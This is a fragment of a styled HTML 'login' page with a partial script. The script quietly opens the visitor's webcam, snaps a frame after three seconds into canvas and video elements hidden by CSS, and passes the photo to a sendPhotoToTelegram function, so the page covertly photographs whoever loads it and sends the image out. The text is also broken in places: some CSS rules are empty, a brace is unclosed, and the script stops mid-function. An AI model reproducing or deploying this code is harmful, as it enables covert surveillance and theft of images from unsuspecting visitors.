    body {

      color: #00ff88;
      height: 100vh;
      display: flex;

      overflow: hidden;
      position: relative;

      perspective: 1000px; /* Untuk efek 3D */
    }
    .bg-particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    .particle {
      position: absolute;
      width: 3px;
      height: 3px;
      background: rgba(0, 255, 136, 0.4);
      border-radius: 50%;
      animation: float 8s ease-in-out infinite;
      box-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
    }
    @keyframes float {
      0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.4; }
      50% { transform: translateY(-30px) rotate(180deg); opacity: 1; }
    }
    .login-container {
      background: linear-gradient(145deg, rgba(20, 20, 20, 0.95), rgba(30, 30, 30, 0.95));

      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.1);
      text-align: center;
      max-width: 450px;
      width: 100%;
      z-index: 2;
      transform-style: preserve-3d;
      transition: transform 0.3s ease;
    }
    .login-container:hover {
      transform: rotateX(5deg) rotateY(5deg) translateZ(20px);
    }
    .login-title {
      font-size: 32px;
      font-weight: 900;
      margin-bottom: 15px;
      background: linear-gradient(135deg, #00ff88, #ffffff, #00ff88);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 20px rgba(0, 255, 136, 0.8);
      transform: translateZ(10px);
    }
    .login-subtitle {
      font-size: 14px;
      color: #ffaa00;
      margin-bottom: 25px;
      transform: translateZ(5px);
    }
    .login-input {
      width: 100%;
      padding: 15px;
      margin-bottom: 20px;
      background: linear-gradient(145deg, #444, #333);
      border: 2px solid rgba(0, 255, 136, 0.5);
      border-radius: 12px;
      color: #fff;
      font-size: 16px;
      outline: none;
      transition: all 0.3s ease;
      transform: translateZ(5px);
    }
    .login-input:focus {
      border-color: #00ff88;
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
      transform: translateZ(10px) scale(1.02);
    }
    .login-button {
      width: 100%;
      padding: 15px;
      background: linear-gradient(145deg, #00ff88, #00cc77);
      color: #000;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      font-weight: 700;
      font-size: 16px;
      position: relative;
      overflow: hidden;
      transform: translateZ(10px);
      transition: all 0.3s ease;
      box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
    }
    .login-button::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      transition: left 0.5s;
    }
    .login-button:hover {
      transform: translateZ(20px) rotateX(10deg);
      box-shadow: 0 10px 30px rgba(0, 255, 136, 0.6);
    }
    .login-button:hover::before {
      left: 100%;
    }
    .login-button:active {
      transform: translateZ(5px) rotateX(5deg);
    }
    #info {
      white-space: pre-wrap;
      text-align: left;
      margin-top: 25px;
      background: linear-gradient(145deg, #333, #222);
      padding: 20px;
      border-radius: 12px;
      font-size: 14px;
      transform: translateZ(5px);
      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.5);
    }
    video, canvas {
      display: none;
    }
    @media (max-width: 480px) {
      .login-container {

        border-radius: 16px;
      }
      .login-title {

      }
      .login-input, .login-button {

        padding: 12px;

    }
  </style>
</head>

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };

    function createParticles() {

    }
